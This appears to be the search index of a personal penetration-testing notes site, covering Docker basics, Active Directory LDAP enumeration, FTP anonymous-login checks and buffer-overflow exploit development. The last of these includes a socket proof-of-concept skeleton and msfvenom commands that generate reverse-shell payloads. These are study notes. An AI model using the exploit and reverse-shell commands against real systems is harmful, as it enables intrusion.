{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"__ LeeCyberSec __ \"A BUG IS NEVER JUST A MISTAKE. IT REPRESENTS SOMETHING BIGGER. AN ERROR OF THINKING. THAT MAKES YOU WHO YOU ARE\" - MR. ROBOT Email: leecybersec@gmail.com Platform: HackTheBox || TryHackMe || PentesterLab","title":"Home"},{"location":"#__leecybersec__","text":"\"A BUG IS NEVER JUST A MISTAKE. IT REPRESENTS SOMETHING BIGGER. AN ERROR OF THINKING. THAT MAKES YOU WHO YOU ARE\" - MR. ROBOT Email: leecybersec@gmail.com Platform: HackTheBox || TryHackMe || PentesterLab","title":"__LeeCyberSec__"},{"location":"blue-teaming/","text":"Blue Teams Academy - Free Training 2022","title":"Blue Team Training"},{"location":"blue-teaming/#blue-teams-academy-free-training-2022","text":"","title":"Blue Teams Academy - Free Training 2022"},{"location":"devsecops/","text":"Secure-docker Docker Basics Docker Hacking","title":"Table of contents"},{"location":"devsecops/cac/","text":"Compliance as Code","title":"Compliance"},{"location":"devsecops/cac/#compliance-as-code","text":"","title":"Compliance as Code"},{"location":"devsecops/ci-cd/","text":"Continuous integration and continuous delivery","title":"CI/CD"},{"location":"devsecops/ci-cd/#continuous-integration-and-continuous-delivery","text":"","title":"Continuous integration and continuous delivery"},{"location":"devsecops/dast/","text":"Dynamic Application Security Testing","title":"DAST"},{"location":"devsecops/dast/#dynamic-application-security-testing","text":"","title":"Dynamic Application Security Testing"},{"location":"devsecops/docker/docker-basics/","text":"Docker Basics Docker commands https://docs.docker.com/engine/reference/commandline Images docker search nmap Pull image docker pull uzyexe/nmap Run image: docker run -it uzyexe/nmap --help docker run -i -d --name myubuntu ubuntu -d for running in the backgound \u2013interactive or -i argument keep the container running Check history in images docker image history image-name Containers Run a command in a running container docker exec myubuntu whoami spawn a shell in the container docker exec -it myubuntu bash List containers docker ps -a Show the running processes of a container docker top myubuntu Check logs in the container docker logs CONTAINER_ID Manage Data In Docker Docker volumes create volume docker volume create data /# ls /var/lib/docker/volumes/ data metadata.db run a container to use data volumes docker run --name ubuntu -d -v data:/opt -it ubuntu:18.04 Bind mounts docker run --name ubuntu -d -v /opt:/opt -it ubuntu:18.04 tmpfs mounts https://docs.docker.com/storage/tmpfs/ Docker Registry Deploy local registry https://docs.docker.com/registry/deploying/ docker run -d -p 5000 :5000 --restart = always --name registry registry:2 Store the images add the image name with the registry url as a prefix docker tag ubuntu:1.0 localhost:5000/ubuntu:1.0 push the image to the docker registry docker push localhost:5000/ubuntu:1.0 check images on the registy curl localhost:5000/v2/_catalog Docker Networking Basic commands See available networks docker network ls docker network list remove docker network rm mynetwork Network Descriptions bridge This is the default network driver when you don\u2019t specify a driver to the containers. Containers on the same bridged network can speak to each other, but are isolated from containers on other bridged networks. All containers can access the external network through NAT host The containers use the host\u2019s networking directly, while retaining separation on storage and processing. Ports exposed by the container are exposed on the external network using the host\u2019s IP address macvlan When creating a macvlan, you assign a parent network device (e.g. \u201ceth0\u201d). Each container on the macvlan network will receive its own MAC address on the network that eth0 is connected to. Each container has full network access. Warning: when misconfigured, you may overrun the network with too many MACs, or you may duplicate IP addresses none networking is disabled with this network driver, containers cannot communicate to each others, nor with the external network Bridge config https://blog.oddbit.com/post/2018-03-12-using-docker-macvlan-networks/ Create new and view detail docker network create mynetwork docker network create --subnet 192 .10.1.0/16 app docker inspect mynetwork attach container using mynetwork docker run -d --name ubuntu --network mynetwork -it ubuntu:18.04 connect to running container docker network connect app ubuntu macvlan config create docker network create --driver macvlan mymacvlan attach container using mymacvlan docker run -d --name ubuntu --network mymacvlan -it ubuntu:18.04 detail vlan for container docker inspect ubuntu -f \"{{json .NetworkSettings.Networks }}\" | jq https://docs.docker.com/network/macvlan/ none config create docker run -d --name ubuntu --network = none -it ubuntu:18.04 Create Docker Image Dockerfile Dockerfile Syntax Description # FROM python base image FROM ubuntu:18.04 # COPY startup script COPY . /app WORKDIR /app RUN apt update && apt install nginx -y RUN apk add --no-cache gawk sed bash grep bc coreutils # EXPOSE port 8080 for communication to/from server EXPOSE 8080 ENTRYPOINT [ \"/bin/bash\" , \"-c\" ] # CMD specifcies the command to execute container starts running. CMD [ \"/app/run_app_docker.sh\" ] Syntax Description FROM: Creates a layer from Docker Image. Specifies the base image to use. COPY: Copies the files from the local directory to the docker image on a specific location. ADD: Similar to COPY but supports file download (HTTP), auto extracting compressed file(s), and replacing the existing file to a specific location if needed forcefully. RUN: Run OS command (just like you would do on a terminal) but only executes it during the image creation process. ENTRYPOINT: Run a command as the default command when the container starts. Its the entrypoint to the utility/command. CMD: Command to run when a container starts or arguments to ENTRYPOINT if specified. https://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/ sleep infinity tells the container to keep the process alive. FROM ubuntu:18.04 RUN apt update && apt install nginx -y CMD [ \"/bin/bash\" , \"-c\" , \"service nginx start; sleep infinity\" ] Build Image https://docs.docker.com/engine/reference/builder/ docker build -f /path/to/a/Dockerfile -t shykes/myapp . -f flag with docker build to point to a Dockerfile anywhere in your file system -t tag at which to save the new image Docker Compose Introduction Dockerfile: handle 1 container Docker Compose: handle multiple containers using a single file called docker-compose.yml version: \"3\" services: ubuntu: image: ubuntu:18.04 stdin_open: true # the same way like docker run -i Run docker-compose up -d Compose file docker-compose.yml Syntax Descriptions version: \"3\" services: web: image: nginx container_name: webserver # name of container ports: - \"80:80\" # similar to docker run -p 80:80 environment: - NGINX_HOST = example.com # similar to docker run -e VAR=value volumes: - ./:/var/www/html/app # ./ means a bind mounts - image_data:/var/www/html/images # image_data means use docker volume volumes: image_data: # similar to docker volume create Syntax Descriptions version Version of compose file format to use image Specify the image to run container_name Specify a custom container name, rather than a default name ports Expose port(s), similar to docker run -p argument environment Add environment variables into the container by defining a key-value pair volumes Volumes to save our data persistently using various options type like bind or volumes","title":"Docker Basics"},{"location":"devsecops/docker/docker-basics/#docker-basics","text":"","title":"Docker Basics"},{"location":"devsecops/docker/docker-basics/#docker-commands","text":"https://docs.docker.com/engine/reference/commandline","title":"Docker commands"},{"location":"devsecops/docker/docker-basics/#images","text":"docker search nmap Pull image docker pull uzyexe/nmap Run image: docker run -it uzyexe/nmap --help docker run -i -d --name myubuntu ubuntu -d for running in the backgound \u2013interactive or -i argument keep the container running Check history in images docker image history image-name","title":"Images"},{"location":"devsecops/docker/docker-basics/#containers","text":"Run a command in a running container docker exec myubuntu whoami spawn a shell in the container docker exec -it myubuntu bash List containers docker ps -a Show the running processes of a container docker top myubuntu Check logs in the container docker logs CONTAINER_ID","title":"Containers"},{"location":"devsecops/docker/docker-basics/#manage-data-in-docker","text":"","title":"Manage Data In Docker"},{"location":"devsecops/docker/docker-basics/#docker-volumes","text":"create volume docker volume create data /# ls /var/lib/docker/volumes/ data metadata.db run a container to use data volumes docker run --name ubuntu -d -v data:/opt -it ubuntu:18.04","title":"Docker volumes"},{"location":"devsecops/docker/docker-basics/#bind-mounts","text":"docker run --name ubuntu -d -v /opt:/opt -it ubuntu:18.04","title":"Bind mounts"},{"location":"devsecops/docker/docker-basics/#tmpfs-mounts","text":"https://docs.docker.com/storage/tmpfs/","title":"tmpfs mounts"},{"location":"devsecops/docker/docker-basics/#docker-registry","text":"","title":"Docker Registry"},{"location":"devsecops/docker/docker-basics/#deploy-local-registry","text":"https://docs.docker.com/registry/deploying/ docker run -d -p 5000 :5000 --restart = always --name registry registry:2","title":"Deploy local registry"},{"location":"devsecops/docker/docker-basics/#store-the-images","text":"add the image name with the registry url as a prefix docker tag ubuntu:1.0 localhost:5000/ubuntu:1.0 push the image to the docker registry docker push localhost:5000/ubuntu:1.0 check images on the registy curl localhost:5000/v2/_catalog","title":"Store the images"},{"location":"devsecops/docker/docker-basics/#docker-networking","text":"","title":"Docker Networking"},{"location":"devsecops/docker/docker-basics/#basic-commands","text":"See available networks docker network ls docker network list remove docker network rm mynetwork Network Descriptions bridge This is the default network driver when you don\u2019t specify a driver to the containers. Containers on the same bridged network can speak to each other, but are isolated from containers on other bridged networks. All containers can access the external network through NAT host The containers use the host\u2019s networking directly, while retaining separation on storage and processing. Ports exposed by the container are exposed on the external network using the host\u2019s IP address macvlan When creating a macvlan, you assign a parent network device (e.g. \u201ceth0\u201d). Each container on the macvlan network will receive its own MAC address on the network that eth0 is connected to. Each container has full network access. Warning: when misconfigured, you may overrun the network with too many MACs, or you may duplicate IP addresses none networking is disabled with this network driver, containers cannot communicate to each others, nor with the external network","title":"Basic commands"},{"location":"devsecops/docker/docker-basics/#bridge-config","text":"https://blog.oddbit.com/post/2018-03-12-using-docker-macvlan-networks/ Create new and view detail docker network create mynetwork docker network create --subnet 192 .10.1.0/16 app docker inspect mynetwork attach container using mynetwork docker run -d --name ubuntu --network mynetwork -it ubuntu:18.04 connect to running container docker network connect app ubuntu","title":"Bridge config"},{"location":"devsecops/docker/docker-basics/#macvlan-config","text":"create docker network create --driver macvlan mymacvlan attach container using mymacvlan docker run -d --name ubuntu --network mymacvlan -it ubuntu:18.04 detail vlan for container docker inspect ubuntu -f \"{{json .NetworkSettings.Networks }}\" | jq https://docs.docker.com/network/macvlan/","title":"macvlan config"},{"location":"devsecops/docker/docker-basics/#none-config","text":"create docker run -d --name ubuntu --network = none -it ubuntu:18.04","title":"none config"},{"location":"devsecops/docker/docker-basics/#create-docker-image","text":"","title":"Create Docker Image"},{"location":"devsecops/docker/docker-basics/#dockerfile","text":"Dockerfile Syntax Description # FROM python base image FROM ubuntu:18.04 # COPY startup script COPY . /app WORKDIR /app RUN apt update && apt install nginx -y RUN apk add --no-cache gawk sed bash grep bc coreutils # EXPOSE port 8080 for communication to/from server EXPOSE 8080 ENTRYPOINT [ \"/bin/bash\" , \"-c\" ] # CMD specifcies the command to execute container starts running. CMD [ \"/app/run_app_docker.sh\" ] Syntax Description FROM: Creates a layer from Docker Image. Specifies the base image to use. COPY: Copies the files from the local directory to the docker image on a specific location. ADD: Similar to COPY but supports file download (HTTP), auto extracting compressed file(s), and replacing the existing file to a specific location if needed forcefully. RUN: Run OS command (just like you would do on a terminal) but only executes it during the image creation process. ENTRYPOINT: Run a command as the default command when the container starts. Its the entrypoint to the utility/command. CMD: Command to run when a container starts or arguments to ENTRYPOINT if specified. https://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/ sleep infinity tells the container to keep the process alive. FROM ubuntu:18.04 RUN apt update && apt install nginx -y CMD [ \"/bin/bash\" , \"-c\" , \"service nginx start; sleep infinity\" ]","title":"Dockerfile"},{"location":"devsecops/docker/docker-basics/#build-image","text":"https://docs.docker.com/engine/reference/builder/ docker build -f /path/to/a/Dockerfile -t shykes/myapp . -f flag with docker build to point to a Dockerfile anywhere in your file system -t tag at which to save the new image","title":"Build Image"},{"location":"devsecops/docker/docker-basics/#docker-compose","text":"","title":"Docker Compose"},{"location":"devsecops/docker/docker-basics/#introduction","text":"Dockerfile: handle 1 container Docker Compose: handle multiple containers using a single file called docker-compose.yml version: \"3\" services: ubuntu: image: ubuntu:18.04 stdin_open: true # the same way like docker run -i Run docker-compose up -d","title":"Introduction"},{"location":"devsecops/docker/docker-basics/#compose-file","text":"docker-compose.yml Syntax Descriptions version: \"3\" services: web: image: nginx container_name: webserver # name of container ports: - \"80:80\" # similar to docker run -p 80:80 environment: - NGINX_HOST = example.com # similar to docker run -e VAR=value volumes: - ./:/var/www/html/app # ./ means a bind mounts - image_data:/var/www/html/images # image_data means use docker volume volumes: image_data: # similar to docker volume create Syntax Descriptions version Version of compose file format to use image Specify the image to run container_name Specify a custom container name, rather than a default name ports Expose port(s), similar to docker run -p argument environment Add environment variables into the container by defining a key-value pair volumes Volumes to save our data persistently using various options type like bind or volumes","title":"Compose file"},{"location":"devsecops/docker/docker-hacking/","text":"Docker Hacking","title":"Docker Hacking"},{"location":"devsecops/docker/docker-hacking/#docker-hacking","text":"","title":"Docker Hacking"},{"location":"devsecops/iac/","text":"Infrastructure as Code","title":"Infrastructure"},{"location":"devsecops/iac/#infrastructure-as-code","text":"","title":"Infrastructure as Code"},{"location":"devsecops/sast/","text":"Static Application Security Testing","title":"SAST"},{"location":"devsecops/sast/#static-application-security-testing","text":"","title":"Static Application Security Testing"},{"location":"devsecops/sca-oast/","text":"Software Component Analysis / Open Source Component Application Security Testing List of SCA tools for different programming languages Language SCA tool Document Javascript RetireJS https://github.com/retirejs/retire.js/","title":"SCA/OAST"},{"location":"devsecops/sca-oast/#software-component-analysis-open-source-component-application-security-testing","text":"List of SCA tools for different programming languages Language SCA tool Document Javascript RetireJS https://github.com/retirejs/retire.js/","title":"Software Component Analysis / Open Source Component Application Security Testing"},{"location":"red-teaming/","text":"Unix-basics Basic Commands Basic Terminal Pentest-external-internal Reconnaissance Common Services Remote Code Execution File Transfer Password Attacks Port Redirection & Tunneling Privilege Escalation Active-directory Enumeration Exploit-development Buffer Overflow","title":"Table of contents"},{"location":"red-teaming/active-directory/authentication/","text":"","title":"Authentication"},{"location":"red-teaming/active-directory/enumeration/","text":"Active Directory Enumeration Users and Groups Users Enumeration net user /domain net user hades /domain Group Enumeration net group /domain net localgroup administrators LDAP Enum LDAP://HostName [ :PortNumber ][ /DistinguishedName ] Get Host Name of the Domain Controller [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () Enum ldap-enum.ps1 PS C: \\U sers \\a dmin \\D esktop> . \\l dap-enum.ps1 LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC = leecybersec,DC = local Name Value ---- ----- givenname { admin } <snip> distinguishedname { CN = admin,CN = Users,DC = leecybersec,DC = local } userprincipalname { admin@leecybersec.local } # Generate LDAP path, file `ldap-enum.ps1` # .\\ldap-enum.ps1 # LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local $domainObj = [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () $PDC = ( $domainObj .PdcRoleOwner ) .Name $SearchString = \"LDAP://\" $SearchString + = $PDC + \"/\" $DistinguishedName = \"DC= $( $domainObj .Name.Replace ( '.' , ',DC=' ) )\" $SearchString + = $DistinguishedName $SearchString # Execute LDAP search for each user $Searcher = New-Object System.DirectoryServices.DirectorySearcher ([ ADSI ] $SearchString ) $objDomain = New-Object System.DirectoryServices.DirectoryEntry $Searcher .SearchRoot = $objDomain # supply 0x30000000 (decimal 805306368) to enumerate all users in the domain # $Searcher.filter=\"samAccountType=805306368\" $Searcher .filter = \"name=admin\" $Result = $Searcher .FindAll () Foreach ( $obj in $Result ) { Foreach ( $prop in $obj .Properties ) { $prop } Write-Host \"------------------------\" } Resolving Nested Groups","title":"Enumeration"},{"location":"red-teaming/active-directory/enumeration/#active-directory-enumeration","text":"","title":"Active Directory Enumeration"},{"location":"red-teaming/active-directory/enumeration/#users-and-groups","text":"Users Enumeration net user /domain net user hades /domain Group Enumeration net group /domain net localgroup administrators","title":"Users and Groups"},{"location":"red-teaming/active-directory/enumeration/#ldap-enum","text":"LDAP://HostName [ :PortNumber ][ /DistinguishedName ] Get Host Name of the Domain Controller [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () Enum ldap-enum.ps1 PS C: \\U sers \\a dmin \\D esktop> . \\l dap-enum.ps1 LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC = leecybersec,DC = local Name Value ---- ----- givenname { admin } <snip> distinguishedname { CN = admin,CN = Users,DC = leecybersec,DC = local } userprincipalname { admin@leecybersec.local } # Generate LDAP path, file `ldap-enum.ps1` # .\\ldap-enum.ps1 # LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local $domainObj = [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () $PDC = ( $domainObj .PdcRoleOwner ) .Name $SearchString = \"LDAP://\" $SearchString + = $PDC + \"/\" $DistinguishedName = \"DC= $( $domainObj .Name.Replace ( '.' , ',DC=' ) )\" $SearchString + = $DistinguishedName $SearchString # Execute LDAP search for each user $Searcher = New-Object System.DirectoryServices.DirectorySearcher ([ ADSI ] $SearchString ) $objDomain = New-Object System.DirectoryServices.DirectoryEntry $Searcher .SearchRoot = $objDomain # supply 0x30000000 (decimal 805306368) to enumerate all users in the domain # $Searcher.filter=\"samAccountType=805306368\" $Searcher .filter = \"name=admin\" $Result = $Searcher .FindAll () Foreach ( $obj in $Result ) { Foreach ( $prop in $obj .Properties ) { $prop } Write-Host \"------------------------\" }","title":"LDAP Enum"},{"location":"red-teaming/active-directory/enumeration/#resolving-nested-groups","text":"","title":"Resolving Nested Groups"},{"location":"red-teaming/active-directory/lateral-movement/","text":"","title":"Lateral Movement"},{"location":"red-teaming/active-directory/persistent/","text":"","title":"Persistent"},{"location":"red-teaming/exploit-dev/buffer-overflow/","text":"Buffer Overflow poc.py #!/usr/bin/python import sys , socket if len ( sys . argv ) < 2 : print \" \\n Usage: \" + sys . argv [ 0 ] + \" <ip> \\n \" sys . exit () junk = \" \\x41 \" * # number eip = \"\" # jmp esp nop = \" \\x90 \" * 8 shell = () buffer = junk + eip + nop + shell s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) # IPv4 (AF_INET), TCP (SOCK_STREAM) s . connect (( sys . argv [ 1 ], 9001 )) s . send ( buffer ) s . recv ( 1024 ) s . close () Offset Create pattern for juck value /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number> Identify the offset /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> Go to esp Install mona : https://github.com/corelan/mona !mona modules assembly to hex converter : https://defuse.ca/online-x86-assembler.htm JMP ESP !mona find -s \"\\xff\\xe4\" -m \"app.dll\" CALL ESP !mona find -s \"\\xff\\xd4\" -m \"app.dll\" PUSH ESP --> RET !mona find -s \"\\x54\\xc3\" -m \"app.dll\" https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret Locate payload nop = \" \\x90 \" * 4 Badchars \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" Exploit Payload msfvenom -p windows/shell_reverse_tcp lhost = <ip> lport = 443 EXITFUNC = thread -f c -b \"\\x00\" -e x86/shikata_ga_nai msfvenom -p linux/x86/shell_reverse_tcp lhost = <ip> lport = 443 EXITFUNC = thread -f c -b \"\\x00\" -e x86/shikata_ga_nai More practice https://blog.hackerenv.com/buffer-overflow-tutorial-step-by-step-with-immunity-debugger-3 https://github.com/V1n1v131r4/OSCP-Buffer-Overflow","title":"Buffer Overflow"},{"location":"red-teaming/exploit-dev/buffer-overflow/#buffer-overflow","text":"","title":"Buffer Overflow"},{"location":"red-teaming/exploit-dev/buffer-overflow/#pocpy","text":"#!/usr/bin/python import sys , socket if len ( sys . argv ) < 2 : print \" \\n Usage: \" + sys . argv [ 0 ] + \" <ip> \\n \" sys . exit () junk = \" \\x41 \" * # number eip = \"\" # jmp esp nop = \" \\x90 \" * 8 shell = () buffer = junk + eip + nop + shell s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) # IPv4 (AF_INET), TCP (SOCK_STREAM) s . connect (( sys . argv [ 1 ], 9001 )) s . send ( buffer ) s . recv ( 1024 ) s . close ()","title":"poc.py"},{"location":"red-teaming/exploit-dev/buffer-overflow/#offset","text":"Create pattern for juck value /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number> Identify the offset /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value>","title":"Offset"},{"location":"red-teaming/exploit-dev/buffer-overflow/#go-to-esp","text":"Install mona : https://github.com/corelan/mona !mona modules assembly to hex converter : https://defuse.ca/online-x86-assembler.htm","title":"Go to esp"},{"location":"red-teaming/exploit-dev/buffer-overflow/#jmp-esp","text":"!mona find -s \"\\xff\\xe4\" -m \"app.dll\"","title":"JMP ESP"},{"location":"red-teaming/exploit-dev/buffer-overflow/#call-esp","text":"!mona find -s \"\\xff\\xd4\" -m \"app.dll\"","title":"CALL ESP"},{"location":"red-teaming/exploit-dev/buffer-overflow/#push-esp-ret","text":"!mona find -s \"\\x54\\xc3\" -m \"app.dll\" https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret","title":"PUSH ESP --&gt; RET"},{"location":"red-teaming/exploit-dev/buffer-overflow/#locate-payload","text":"nop = \" \\x90 \" * 4","title":"Locate payload"},{"location":"red-teaming/exploit-dev/buffer-overflow/#badchars","text":"\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"","title":"Badchars"},{"location":"red-teaming/exploit-dev/buffer-overflow/#exploit-payload","text":"msfvenom -p windows/shell_reverse_tcp lhost = <ip> lport = 443 EXITFUNC = thread -f c -b \"\\x00\" -e x86/shikata_ga_nai msfvenom -p linux/x86/shell_reverse_tcp lhost = <ip> lport = 443 EXITFUNC = thread -f c -b \"\\x00\" -e x86/shikata_ga_nai","title":"Exploit Payload"},{"location":"red-teaming/exploit-dev/buffer-overflow/#more-practice","text":"https://blog.hackerenv.com/buffer-overflow-tutorial-step-by-step-with-immunity-debugger-3 https://github.com/V1n1v131r4/OSCP-Buffer-Overflow","title":"More practice"},{"location":"red-teaming/exploit-dev/metasploit-framework/","text":"","title":"Metasploit Framework"},{"location":"red-teaming/exploit-dev/nse-script/","text":"","title":"Nmap Scripting Engine"},{"location":"red-teaming/malware-development/","text":"Malware development https://0xpat.github.io/Malware_development_part_1 https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86","title":"Malware development"},{"location":"red-teaming/malware-development/#malware-development","text":"https://0xpat.github.io/Malware_development_part_1 https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86","title":"Malware development"},{"location":"red-teaming/mobile-application/","text":"","title":"Index"},{"location":"red-teaming/network-pentest/common-services/00000-general/","text":"General Reference Common Ports and Services 0daysecurity Enumeration Service unknown - Port XXX $ amap -d $ip $port amap v5.4 ( www.thc.org/thc-amap ) started at 2020 -09-09 23 :30:39 - APPLICATION MAPPING mode Protocol on <ip>:<port>/tcp matches ftp Dump of identified response from <ip>:<port>/tcp ( by trigger http ) : 0000 : 3232 3020 4d69 6372 6f73 6f66 7420 4654 [ 220 Microsoft FT ] 0010 : 5020 5365 7276 6963 650d 0a35 3030 2043 [ P Service..500 C ] 0020 : 6f6d 6d61 6e64 206e 6f74 2075 6e64 6572 [ ommand not under ] 0030 : 7374 6f6f 642e 0d0a 3530 3020 436f 6d6d [ stood...500 Comm ] 0040 : 616e 6420 6e6f 7420 756e 6465 7273 746f [ and not understo ] 0050 : 6f64 2e0d 0a [ od... ]","title":"general"},{"location":"red-teaming/network-pentest/common-services/00000-general/#general","text":"","title":"General"},{"location":"red-teaming/network-pentest/common-services/00000-general/#reference","text":"Common Ports and Services 0daysecurity Enumeration","title":"Reference"},{"location":"red-teaming/network-pentest/common-services/00000-general/#service-unknown-port-xxx","text":"$ amap -d $ip $port amap v5.4 ( www.thc.org/thc-amap ) started at 2020 -09-09 23 :30:39 - APPLICATION MAPPING mode Protocol on <ip>:<port>/tcp matches ftp Dump of identified response from <ip>:<port>/tcp ( by trigger http ) : 0000 : 3232 3020 4d69 6372 6f73 6f66 7420 4654 [ 220 Microsoft FT ] 0010 : 5020 5365 7276 6963 650d 0a35 3030 2043 [ P Service..500 C ] 0020 : 6f6d 6d61 6e64 206e 6f74 2075 6e64 6572 [ ommand not under ] 0030 : 7374 6f6f 642e 0d0a 3530 3020 436f 6d6d [ stood...500 Comm ] 0040 : 616e 6420 6e6f 7420 756e 6465 7273 746f [ and not understo ] 0050 : 6f64 2e0d 0a [ od... ]","title":"Service unknown - Port XXX"},{"location":"red-teaming/network-pentest/common-services/00021-ftp/","text":"ftp 21 Common cedentials anonymous admin:admin Check for anonymous access $ ftp $ip $port Connected to <ip>. 220 Microsoft FTP Service Name ( <ip>:<host> ) : anonymous 331 Anonymous access allowed, send identity ( e-mail name ) as password. Password: 230 User logged in . Remote system type is Windows_NT. ftp> FTP Common Commands ftp> passive Passive mode on. ftp> binary 200 Type set to I. ftp> ascii 200 Type set to A. ftp> upload <file> ftp> get <file> ftp> quit 221 Goodbye.","title":"21 ftp"},{"location":"red-teaming/network-pentest/common-services/00021-ftp/#ftp-21","text":"","title":"ftp 21"},{"location":"red-teaming/network-pentest/common-services/00021-ftp/#common-cedentials","text":"anonymous admin:admin","title":"Common cedentials"},{"location":"red-teaming/network-pentest/common-services/00021-ftp/#check-for-anonymous-access","text":"$ ftp $ip $port Connected to <ip>. 220 Microsoft FTP Service Name ( <ip>:<host> ) : anonymous 331 Anonymous access allowed, send identity ( e-mail name ) as password. Password: 230 User logged in . Remote system type is Windows_NT. ftp>","title":"Check for anonymous access"},{"location":"red-teaming/network-pentest/common-services/00021-ftp/#ftp-common-commands","text":"ftp> passive Passive mode on. ftp> binary 200 Type set to I. ftp> ascii 200 Type set to A. ftp> upload <file> ftp> get <file> ftp> quit 221 Goodbye.","title":"FTP Common Commands"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/","text":"ssh 22 Target host\u2019s fingerprint Adding (whitelisting) the target host\u2019s fingerprint 